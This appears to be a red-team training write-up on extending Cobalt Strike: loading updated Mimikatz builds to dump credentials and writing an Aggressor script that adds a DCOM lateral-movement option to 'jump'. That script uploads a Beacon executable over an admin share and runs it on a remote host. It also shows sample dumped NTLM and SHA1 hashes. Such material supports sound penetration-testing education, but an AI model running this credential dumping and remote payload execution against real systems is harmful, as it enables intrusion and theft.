---
description: 11/12/2025
---

# Extending Cobalt Strike

## Introduction

The "best" C2 frameworks in RastaMouse's opinion are those that have the capability to customize and diversify its behaviors.

We have already seen how the Artifact and Resource Kits can be used to modify Beacon to bypass antivirus solutions.

The `.cna` files that we load into the Cobalt Strike Script Manager are called _**Aggressor Scripts**_.

These can override default behaviors in CObalt Strike to customize the UI (add new menus, commands, etc), extended the data modules, extended existing commands like `jump`, and add brand new, custom commands.

Beacon also has an internal API that we can call from Aggressor, so any base primitive that Beacon has (`powershell`, `execute-assembly`, etc.) can also be called from Aggressor.

The Aggressor script reference is public and available at [helpsystems.com](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/agressor_script.htm). The underlying programming language used is called [Sleep](http://sleep.dashnine.org/manual/index.html).

When working with Aggressor, you will find functions from both the Aggressor script reference and Sleep.

## MimiKatz Kit

**You may notice instances where you have tried to run commands such as `sekurlsa::logonpasswords` and `sekurlsa::ekeys`, only to receive the following error:**

```
beacon> logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
```

This is usually because the version of Mimikatz built into Cobalt Strike by default is too old to work on later versions of Windows such as 11 and Server 2022. &#x20;

The Mimikatz Kit allows you to bring alternate builds of Mimikatz into CS to overcome this limitation.

**Confusingly, CS is actually bundled with multiple flavours of Mimikatz in both x86 and x64 builds:**

```
PS C:\Tools\cobaltstrike\arsenal-kit\kits\mimikatz> ls

    Directory: C:\Tools\cobaltstrike\arsenal-kit\kits\mimikatz

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        05/12/2022     16:57           1046 build.sh
-a----        05/12/2022     16:57         773120 mimikatz-chrome.x64.dll
-a----        05/12/2022     16:57         638464 mimikatz-chrome.x86.dll
-a----        05/12/2022     16:57         813568 mimikatz-full.x64.dll
-a----        05/12/2022     16:57         704000 mimikatz-full.x86.dll
-a----        05/12/2022     16:57        1421824 mimikatz-max.x64.dll
-a----        05/12/2022     16:57        1192960 mimikatz-max.x86.dll
-a----        05/12/2022     16:57         312832 mimikatz-min.x64.dll
-a----        05/12/2022     16:57         276480 mimikatz-min.x86.dll
-a----        05/12/2022     16:57           2661 README.md
-a----        05/12/2022     16:57           1007 script_template.cna
```

The DLLs are custom-built to include a reflective loader and modified code to achieve a smaller file size, which is required to work with Beacon's legacy 1 MB size limit.

The "max" versions include the complete Mimikatz codebase, which can be used with CS 4.6 and above as the 1 MB limit can be removed. &#x20;

The "full" versions have some code stripped out to reduce the file size (although no official documentation seems to exists that explains exactly what is removed); and the "chrome" versions contains code pertinent to Beacon's `chromedump` command. &#x20;

Again, no documentation seems to exist that states which parts of the Mimikatz codebase this is, but I suspect it's at least `dpapi::chrome`.

### Where you can find the MimiKatz Kit

The good news is that the CS dev team are making an effort to keep the version of Mimikatz inside the Mimikatz Kit up-to-date with [Benjamin's repo](https://github.com/gentilkiwi/mimikatz). &#x20;

This means we can simply build the kit as-is and load it into CS.  This is as simple as running `build.sh` and specifying an output directory.

```
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/mimikatz> pwd
/mnt/c/Tools/cobaltstrike/arsenal-kit/kits/mimikatz

ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/mimikatz> ./build.sh /mnt/c/Tools/cobaltstrike/mimikatz
[Mimikatz kit] [+] Copying the mimikatz dlls
[Mimikatz kit] [+] Generate the mimikatz.cna from the template file.
[Mimikatz kit] [+] The Mimikatz files are saved in '/mnt/c/Tools/cobaltstrike/mimikatz'
```

Load `mimikatz.cna` via the _**Cobalt Strike > Script Manager**_ menu and clicking the _**Load**_**&#x20;button**. &#x20;

After loading the CNA, Mimikatz will now function as expected.

```
beacon> logonpasswords

Authentication Id : 0 ; 64753 (00000000:0000fcf1)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/15/2023 3:03:57 PM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : WEB$
	 * Domain   : DEV
	 * NTLM     : 4b5aff0a96dfb6c6240340a6800e6f11
	 * SHA1     : bd13b64953a55abddf7b9c1bdcc043a9d88fd955
```

## Jump & Remote-Exec

Aggressor can be used to register new techniques under `jump` and `remote-exec` using [beacon\_remote\_exploit\_register](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_remote_exploit_register) and [beacon\_remote\_exec\_method\_register](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_remote_exec_method_register) respectively.

In this example, we'll integrate `Invoke-DCOM.ps1` into `jump`.  First, create a new text file in Visual Studio and save is somewhere as `dcom.cna`.  Then add the following skeleton.

```
sub invoke_dcom
{
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```

This will register "dcom" as a new option inside the jump command and specifies `invoke_dcom` as the associated callback function.  The first thing to add inside this callback are some local variable declarations.

```
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```

`local` defines variables that are local to the current function, so they will disappear once executed.  Sleep can have `global`, `closure-specific` and `local` scopes.  More information can be found in **5.2 Scalar Scope** of the Sleep manual.

The next step is to acknowledge receipt of the task using [btask](https://download.cobaltstrike.com/aggressor-script/functions.html#btask).  This takes the ID of the Beacon, the text to post and an ATT\&CK tactic ID.  This will print a message to the Beacon console and add it to the data model used in the activity and session reports that you can generate from Cobalt Strike.

```
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');

    # acknowledge this command
    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");
}
```

You'll notice `$1`, `$2` and `$3` variables here which are automatically passed in by the client.  Where:

* $1 is the Beacon ID.
* $2 is the target to jump to.
* $3 is the selected listener

Furthermore, [listener\_describe](https://download.cobaltstrike.com/aggressor-script/functions.html#listener_describe) expands a listener name into a more detailed description.  For example, instead of "smb" it will say "windows/beacon\_bind\_pipe (\\\\.\pipe\\\<pipename>)".

Next, we want to read in the Invoke-DCOM script from our machine.  This can be done [openf](http://sleep.dashnine.org/manual/openf.html), [getFileProper](http://sleep.dashnine.org/manual/getFileProper.html) and [script\_resource](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#script_resource).  Notice how we're assigning values to the variables we declared at the start.

```
# read the script
$handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
$script = readb($handle, -1);
closef($handle);
```

The `$script` variable now holds the raw content of Invoke-DCOM.ps1.  For Beacon to utilise it, we can use [beacon\_host\_script](https://download.cobaltstrike.com/aggressor-script/functions.html#beacon_host_script) - this will host the script inside Beacon and returns a short snippet for running it.

```
# host the script in Beacon
$oneliner = beacon_host_script($1, $script);
```

&#x20; If you want to see the content of these variables, you can use `println($oneliner);` and they'll appear in the Script Console (_Cobalt Strike > Script Console_).

The next step is to generate and upload a payload to the target using [artifact\_payload](https://download.cobaltstrike.com/aggressor-script/functions.html#artifact_payload)and [bupload\_raw](https://download.cobaltstrike.com/aggressor-script/functions.html#bupload_raw).  This will generate an EXE payload and upload it to the target in the `C:\Windows\Temp` directory.

```
# generate stageless payload
$payload = artifact_payload($3, "exe", "x64");

# upload to the target
bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);
```

&#x20; `$+` concatenates an interpolated string and requires additional whitespaces on each end.

Then, [bpowerpick](https://download.cobaltstrike.com/aggressor-script/functions.html#bpowerpick) can execute the Invoke-DCOM oneliner.  We pass it the target computer name and the path to the uploaded payload.  Also, because this could be a P2P payload - we want to automatically try and link to it, which can be done with [beacon\_link](https://download.cobaltstrike.com/aggressor-script/functions.html#beacon_link).

```
# run via powerpick
bpowerpick!($1, "Invoke-DCOM -ComputerName $+ $2 $+ -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);

# link if p2p beacon
beacon_link($1, $2, $3);
```

**The final script:**

```
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');

    # acknowledge this command1
    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");

    # read in the script
    $handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
    $script = readb($handle, -1);
    closef($handle);

    # host the script in Beacon
    $oneliner = beacon_host_script($1, $script);

    # generate stageless payload
    $payload = artifact_payload($3, "exe", "x64");

    # upload to the target
    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);

    # run via powerpick
    bpowerpick!($1, "Invoke-DCOM -ComputerName  $+  $2  $+  -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);

    # link if p2p beacon
    beacon_link($1, $2, $3);
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```

Make sure to load the script via the Script Manger (_Cobalt Strike > Script Manager_).

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

The flexibility of Aggressor means that we can leverage anything from PowerShell, execute-assembly, shellcode injection, DLL injection and more.

## Beacon Object Files (BOFs)

